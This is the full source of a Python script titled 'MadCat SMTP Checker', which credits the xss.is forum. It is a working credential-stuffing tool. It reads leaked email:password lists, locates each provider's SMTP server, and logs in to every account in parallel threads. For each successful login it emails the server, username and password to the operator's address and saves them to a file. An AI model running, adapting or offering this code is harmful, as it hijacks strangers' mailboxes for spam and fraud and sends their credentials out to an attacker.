#!/usr/local/bin/python3

import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, requests
from base64 import b64encode

try:
	import psutil
	from dns import resolver
except ImportError:
	print('\033[1;33minstalling missing packages...\033[0m')
	os.system(f'{sys.executable} -m pip install psutil dnspython')
	import psutil
	from dns import resolver

# mail providers, where SMTP access is desabled by default
bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo'

if sys.version_info[0] < 3:
	raise Exception('\033[0;31mPython 3 is required. Try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')

def show_banner():
	banner = """\033[0;33m

              ,▄   .╓███?                ,, .╓███)                              
            ╓███| ╓█████▌               ╓█/,███╙                  ▄▌            
           ▄█^[██╓█* ██}   ,,,        ,╓██ ███`     ,▌          ╓█▀             
          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
         ╙█                           ╙                                         
          ╙     MadCat SMTP Checker v2.1\033[0m
                Made by \033[1;33mAels\033[0m for community: \033[0;32mhttps://xss.is\033[0m - forum of security professionals
                https://github.com/aels/mailtools
                https://t.me/\033[1;33mfreebug\033[0m\n\n"""
	time.sleep(1)
	for line in banner.splitlines():
		print(line)
		time.sleep(0.05)

def red(s,type):
	return f'\033[{str(type)};31m{str(s)}\033[0m'

def green(s,type):
	return f'\033[{str(type)};32m{str(s)}\033[0m'

def yellow(s,type):
	return f'\033[{str(type)};33m{str(s)}\033[0m'

def blue(s,type):
	return f'\033[{str(type)};34m{str(s)}\033[0m'

def violet(s,type):
	return f'\033[{str(type)};35m{str(s)}\033[0m'

def cyan(s,type):
	return f'\033[{str(type)};36m{str(s)}\033[0m'

def white(s,type):
	return f'\033[{str(type)};37m{str(s)}\033[0m'

def bold(s):
	return f'\033[1m{str(s)}\033[0m'

def num(s):
	return f'{int(s):,}'

def tune_network():
	try:
		os.system('ulimit -n 15000')
		os.system('ulimit -n 65535')
		# if os.geteuid() == 0:
		# 	print('tuning network settings...')
		# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
		# else:
		# 	print('Better to run this script as root to allow better network performance')
	except:
		pass

def bytes_to_mbit(b):
	return round(b/1024./1024.*8, 2)

def guess_smtp_server(domain):
	global default_login_template
	try:
		mx_domain = resolver.resolve(domain, 'MX')[0].exchange.to_text()[0:-1]
	except:
		mx_domain = domain
	for h in [mx_domain, domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]:
		for p in [587, 465, 25]:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setblocking(0)
				s.settimeout(1)
				s = ssl.wrap_socket(s) if p==465 else s
				s.connect((h, p))
				s.close()
				return (h, str(p), default_login_template)
			except:
				pass
	return False

def get_smtp_server(domain):
	global mx_cache
	domain = domain.lower()
	if not domain in mx_cache:
		xml = requests.get('https://autoconfig.thunderbird.net/v1.1/'+domain).text
		smtp_host = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<hostname>([\w.-]+)</hostname>', xml)
		smtp_port = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<port>([\d+]+)</port>', xml)
		smtp_login_template = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml)
		if smtp_host and smtp_port and smtp_login_template:
			mx_cache[domain] = (smtp_host[0], smtp_port[0], smtp_login_template[0])
		else:
			mx_cache[domain] = guess_smtp_server(domain)
	if not mx_cache[domain]:
		raise Exception('no connection details found for '+domain)
	return mx_cache[domain]

def get_rand_ip_of_host(host):
	# return random.choice(socket.getaddrinfo(host, 0, family=socket.AF_INET, proto=socket.IPPROTO_TCP))[4][0]
	return random.choice(socket.getaddrinfo(host, 0, 0, 0, proto=socket.IPPROTO_TCP))[4][0]

def quit(signum, frame):
	print('\r\n'*2+cyan('Exiting...',1))
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}$', email.lower())

def find_email_password_collumnes(list_filename):
	email_collumn = False
	password_collumn = False
	with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
		for line in fp:
			line = re.sub(r'[;,\t| \'"]+', ':', line.lower())
			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
			if email_collumn is False and email:
				email_collumn = line.split(email[0])[0].count(':')
			if password_collumn is False and re.search(r'@.+123', line):
				password_collumn = line.split('123')[0].count(':')
			if email_collumn is not False and password_collumn is not False:
				return (email_collumn, password_collumn)
	password_collumn = email_collumn+1
	return (email_collumn, password_collumn)

def wc_count(filename):
	return int(os.popen('wc -l '+filename).read().strip().split(' ')[0])

def is_ignored_host(mail):
	global exclude_mail_hosts
	for ignored_str in exclude_mail_hosts.split(','):
		if ignored_str in mail.split('@')[1]:
			return True
	return False

def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
	global verify_email
	if is_valid_email(smtp_user):
		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
	else:
		smtp_login = smtp_user
	headers_arr = [
				f'From: MadCat checker <{smtp_user}>',
				f'To: {verify_email}',
				f'Subject: new SMTP from MadCat checker',
				f'Return-Path: {smtp_user}',
				f'Reply-To: {smtp_user}',
				'X-Priority: 1',
				'X-MSmail-Priority: High',
				'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
				'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
				'MIME-Version: 1.0',
				'Content-Type: text/html; charset="utf-8"',
				'Content-Transfer-Encoding: base64'
	]
	body = f'{smtp_server}|{port}|{smtp_login}|{password}'
	message_as_str = '\n\n'.join(('\n'.join(headers_arr), b64encode(body.encode()).decode()+'\n'))
	smtp_server_ip = get_rand_ip_of_host(smtp_server)
	smtp_class = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
	server_obj = smtp_class(smtp_server_ip, port, timeout=5)
	server_obj.starttls(context=ssl._create_unverified_context()) if port == '587' else False
	server_obj.ehlo()
	server_obj.login(smtp_login, password)
	server_obj.sendmail(smtp_user, verify_email, message_as_str)
	server_obj.quit()

def worker_item(jobs_que, results_que):
	global threads_count, threads_counter, verify_email, goods, no_jobs_left, loop_times, default_login_template
	while True:
		if (mem_usage>90 or cpu_usage>90) and threads_counter>threads_count:
			break
		if jobs_que.empty():
			if no_jobs_left:
				break
			else:
				results_que.put('queue exhausted, '+bold('sleeping...'))
				time.sleep(1)
				continue
		else:
			time_start = time.perf_counter()
			smtp_server, port, smtp_user, password = jobs_que.get()
			login_template = default_login_template
			try:
				results_que.put(yellow('trying mx for ',1)+yellow(smtp_user+':'+password,0))
				if not smtp_server or not port:
					smtp_server, port, login_template = get_smtp_server(smtp_user.split('@')[1])
				results_que.put(bold('connecting to')+f' {smtp_server}|{port}|{smtp_user}|{password}')
				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
				results_que.put(green(smtp_user+':'+password,1)+green(' sent to '+verify_email,0))
				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
				goods += 1
				time.sleep(1)
			except Exception as e:
				e = str(e).strip()[0:100]
				results_que.put(red(f'{smtp_server}:{port} - {bold(e)}',0))
				open(errors_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password} - {e}\n')
			loop_times.append(time.perf_counter() - time_start)
			loop_times.pop(0) if len(loop_times)>threads_count else 0
	threads_counter -= 1

def every_second():
	global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, threads_count, loop_times, loop_time
	progress_old = progress
	net_usage_old = 0
	time.sleep(1)
	while True:
		speed.append(progress - progress_old)
		speed.pop(0) if len(speed)>10 else 0
		progress_old = progress
		mem_usage = round(psutil.virtual_memory()[2])
		cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
		net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
		net_usage_old += net_usage
		loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
		if mem_usage<80 and cpu_usage<80 or threads_counter<threads_count:
			threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
			threads_counter += 1
		time.sleep(0.1)

def printer(jobs_que, results_que):
	global status_bar, progress
	while True:
		while not results_que.empty():
			thread_status = results_que.get()
			progress += 1 if 'trying' in thread_status else 0
			print(f'\033[2K{thread_status}')
		print(f'\033[2K{status_bar}\033[F')
		time.sleep(0.04)

signal.signal(signal.SIGINT, quit)
show_banner()
tune_network()
try:
	list_filename = sys.argv[1]
	smtp_filename = re.sub(r'\.[^.]+$', '_smtp.'+list_filename.split('.')[-1], list_filename)
	errors_filename = re.sub(r'\.[^.]+$', '_errors.'+list_filename.split('.')[-1], list_filename)
	verify_email = sys.argv[2]
	if not is_valid_email(verify_email):
		raise
	try:
		exclude_mail_hosts = ','.join((sys.argv[3], bad_mail_servers))
	except:
		exclude_mail_hosts = bad_mail_servers
	start_from_line = int(sys.argv[-1]) if re.match(r'\d+', sys.argv[-1]) else 0
except:
	exit(f'usage: \npython3 {sys.argv[0]} '+bold('list.txt verify_email@example.com')+' [ignored,email,domains] [start_from_line]')

jobs_que = queue.Queue()
results_que = queue.Queue()
ignored = 0
goods = 0
mem_usage = 0
cpu_usage = 0
net_usage = 0
threads_count = 50
threads_counter = 0
mx_cache = {}
no_jobs_left = False
loop_times = []
loop_time = 0
speed = []
progress = start_from_line
status_bar = ''
default_login_template = '%EMAILADDRESS%'
total_lines = wc_count(list_filename)
email_collumn, password_collumn = find_email_password_collumnes(list_filename)

print(f'total lines to procceed: {bold(num(total_lines))}')
print(f'email & password colls: {bold(email_collumn)} and {bold(password_collumn)}')
print(f'source filename: {bold(list_filename)}')
print(f'goods filename: {bold(smtp_filename)}')
print(f'bads & report filename: {bold(errors_filename)}')
print(f'verification email: {bold(verify_email)}')
input( 'press '+bold('[ Enter ]')+' to start...')

threading.Thread(target=every_second, daemon=True).start()
threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()

with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
	for i in range(start_from_line):
		line = fp.readline()
	while True:
		status_bar = (
			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
			f'[ mem: {bold(mem_usage)}% ]'+
			f'[ cpu: {bold(cpu_usage)}% ]'+
			f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
			f'[ threads: {bold(threads_counter)} ]'+
			f'[ goods/ignored: {green(goods,1)}/{yellow(ignored,1)} ]'
		)
		while jobs_que.qsize()<threads_count*2:
			line = fp.readline().strip()
			if not line and line!='':
				no_jobs_left = True
				break
			if line.count('|')==3:
				jobs_que.put((line.split('|')))
			else:
				line = re.sub(r'[;,\t| \'"]+', ':', line)
				fields = line.split(':')
				if len(fields)>1 and is_valid_email(fields[email_collumn]) and len(fields[password_collumn])>7 and not is_ignored_host(fields[email_collumn]):
					jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
				else:
					ignored += 1
					progress += 1
		if threads_counter == 0 and no_jobs_left:
			print('\b'*10+green(bold('all done.')))
			break
